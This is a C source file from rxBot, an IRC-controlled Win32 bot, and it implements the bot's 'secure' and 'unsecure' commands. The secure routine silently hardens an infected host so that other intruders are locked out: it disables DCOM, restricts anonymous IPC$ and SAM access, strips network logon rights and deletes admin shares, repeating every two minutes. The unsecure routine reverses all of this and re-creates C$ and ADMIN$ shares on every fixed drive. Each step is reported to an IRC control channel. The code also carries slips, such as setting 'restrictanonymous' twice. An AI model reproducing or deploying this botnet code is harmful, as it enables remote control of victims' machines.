/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
#ifndef NO_SECSYSTEM
int secure_delay=120000;
#endif 

#ifndef NO_NET
NetShares ShareList[]={
		{"IPC$",NULL},
		{"ADMIN$",NULL},
		{"C$","C:\\"},
		{"D$","D:\\"}
};
#endif

DWORD WINAPI SecureThread(LPVOID param) 
{
	SECURE secure = *((SECURE *)param);
	SECURE *secures = (SECURE *)param;
	secures->gotinfo = TRUE;

	if (secure.secure)
		SecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);
	else
		UnSecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);	

	clearthread(secure.threadnum);

	ExitThread(0);
}

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey; 
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="N"; 
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"[SECURE]: Disable DCOM failed.");
			else
				sprintf(sendbuf,"[SECURE]: DCOM disabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"[SECURE]: Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000001;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"[SECURE]: Failed to restrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"[SECURE]: Restricted access to the IPC$ Share.");			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"[SECURE]: Failed to open IPC$ Restriction registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000001;
			if (fRegSetValueEx(hKey, "restrictanonymoussam", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"[SECURE]: Failed to restrict anonymous enumeration of SAM accounts.");
			else
				sprintf(sendbuf,"[SECURE]: Restricted anonymous enumeration of SAM accounts.");			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"[SECURE]: Failed to open enumeration of SAM accounts registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		#ifndef NO_LSARESTRICT
		DWORD dwRet;
		if ((dwRet = SearchForPrivilegedAccounts(L"SeNetworkLogonRight", FALSE)) > 0)
			sprintf(sendbuf,"[SECURE]: Removed SeNetworkLogonRights from %d accounts in local system policy.", dwRet);
		else
			sprintf(sendbuf,"[SECURE]: Failed to remove SeNetworkLogonRights from any accounts in local system policy.");
		#endif
	} else
		sprintf(sendbuf,"[SECURE]: Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	#ifndef NO_NET
	if (!nonetapi32) {
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
 
		do {
			nStatus = fNetShareEnum(NULL, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++) {
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {	
						char* szShareName = new char[wcslen(p->shi502_netname)+1];
						WideCharToMultiByte(CP_ACP, WC_NO_BEST_FIT_CHARS, p->shi502_netname, -1, szShareName, sizeof(szShareName), NULL, NULL);

						if(ShareDel(NULL,szShareName) == NERR_Success)
							_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%S' deleted.",p->shi502_netname);
						else 
							_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to delete '%S' share.",p->shi502_netname);
						if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
						addlog(sendbuf);

						delete szShareName;
					}

					p++;
				}

				fNetApiBufferFree(pBuf);
			} else {
				for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) { 
					if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%s' deleted.",ShareList[i].ShareName);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to delete '%s' share.",ShareList[i].ShareName);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				} 
			}
		} while (nStatus == ERROR_MORE_DATA);	
		sprintf(sendbuf,"[SECURE]: Network shares deleted.");
	} else
		sprintf(sendbuf,"[SECURE]: Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);
	#endif

	return TRUE;
}

BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey; 
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="Y"; 
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"[SECURE]: Enable DCOM failed.");
			else
				sprintf(sendbuf,"[SECURE]: DCOM enabled.");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"[SECURE]: Failed to open DCOM registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000000;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"[SECURE]: Failed to unrestrict access to the IPC$ Share.");
			else
				sprintf(sendbuf,"[SECURE]: Unrestricted access to the IPC$ Share.");			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"[SECURE]: Failed to open IPC$ restriction registry key.");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000000;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"[SECURE]: Failed to unrestrict anonymous enumeration of SAM accounts.");
			else
				sprintf(sendbuf,"[SECURE]: Unrestricted anonymous enumeration of SAM accounts.");			
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"[SECURE]: Failed to open enumeration of SAM accounts registry key.");

		#ifndef NO_LSARESTRICT
		DWORD dwRet;
		if ((dwRet = SearchForPrivilegedAccounts(L"SeNetworkLogonRight", TRUE)) > 0)
			sprintf(sendbuf,"[SECURE]: Added SeNetworkLogonRights to %d accounts in local system policy.", dwRet);
		else
			sprintf(sendbuf,"[SECURE]: Failed to restore SeNetworkLogonRights to accounts in local system policy.");
		#endif	
	} else
		sprintf(sendbuf,"[SECURE]: Advapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	#ifndef NO_NET
	if (!nonetapi32) {
		for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) { 
			if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
				_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%s' added.",ShareList[i].ShareName);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to add '%s' share.",ShareList[i].ShareName);
			if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
			addlog(sendbuf);
		}

		char sharename[10], sharepath[10];
		DWORD dwDrives = GetLogicalDrives();
		for(char cDrive='A'; dwDrives!=0; cDrive++, dwDrives=(dwDrives>>1)) {
			if((dwDrives & 1)==1 && cDrive != 'A') {
				_snprintf(sharename,sizeof(sharename),"%c$",cDrive);
				_snprintf(sharepath,sizeof(sharepath),"%c:\\",cDrive);

				if (fGetDriveType(sharepath) == DRIVE_FIXED) {
					if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%s' added.",sharename);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to add '%s' share.",sharename);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		}

		sprintf(sendbuf,"[SECURE]: Network shares added.");
	} else
		sprintf(sendbuf,"[SECURE]: Netapi32.dll couldn't be loaded.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);
	#endif

	return TRUE;
}

#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecureThread(LPVOID param)
{
	int threadnum = (int)param;

	while (1) {
		SecureSystem(0,NULL,FALSE,TRUE);
		Sleep(secure_delay);
	}
	clearthread(threadnum);

	ExitThread(0);
}
#endif
